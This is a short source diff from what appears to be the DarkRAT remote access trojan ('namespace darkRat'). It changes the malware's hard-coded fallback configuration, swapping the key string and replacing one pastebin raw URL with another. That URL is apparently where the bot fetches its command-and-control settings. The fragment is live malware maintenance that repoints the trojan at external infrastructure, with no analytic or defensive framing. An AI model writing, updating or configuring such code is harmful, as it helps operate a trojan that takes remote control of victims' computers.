@@ -73,7 +73,7 @@ namespace darkRat
 
 				return config(ek, pu, mux, sup, ri, pn);
 			}
-			return config("KCQ", "https://pastebin.com/raw/Yd76WVbu", "mutex", "false", 5, {});
+			return config("KQC", "http://pastebin.com/raw/mTLXBksj", "mutex", "false", 5, {});
 		}
 	}
 }
